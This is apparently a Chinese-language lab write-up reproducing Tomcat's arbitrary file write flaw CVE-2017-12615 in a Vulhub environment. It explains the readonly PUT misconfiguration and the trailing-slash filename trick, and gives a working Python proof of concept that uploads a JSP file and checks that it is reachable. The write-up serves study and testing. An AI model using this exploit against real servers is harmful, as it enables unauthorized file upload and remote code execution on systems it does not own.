# Tomcat 任意文件写入（CVE-2017-12615）

## 介绍
本质是配置文件web.xml的default配置项中readonly导致的。

看看readonly是干嘛的：

![](1.png)

默认是true，true的话PUT和DELETE方法是被拒绝的。如果改为false，我们就能利用，用PUT方法上传文件


然后就可以上传任意文件了？ 首先了解一下： \
org.apache.jasper.servlet.JspServlet：默认处理jsp，jspx文件请求，不存在PUT上传逻辑，无法处理PUT请求
org.apache.catalina.servlets.DefaultServlet：默认处理静态文件（除jsp，jspx之外的文件），存在PUT上传处理逻辑，可以处理PUT请求。

我们能PUT文件到服务器，但jsp文件是不可以被PUT上去的，因为jsp文件会给到JspServlet处理的，而JspServlet没法处理PUT的请求。

只有DefaultServlet能处理PUT请求，通过构造特殊的后缀名绕过（若是windows也有方法绕），从而上传jsp木马。这就是CVE-2017-12615

## 版本
Tomcat 8.5.19
Vulhub

## 漏洞复现
通过在在文件名后面添加斜杠 / 来进行绕过

写一个POC

```
import requests
import sys
body = '''
<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Insert title here</title>
</head>
<body>
    <%
        String str = "hello world";
        out.println(str);
    %>
</body>
</html>
'''
requests.put(sys.argv[1]+'haha.jsp/',data=body)
rq = requests.get(sys.argv[1]+'haha.jsp')
if rq.status_code == 200:
	print ("[+] Finish!")
else:
	print ("[-] Shit!")
```

执行
![](2.png)

访问上传成功了的haha.jsp
![](3.png)

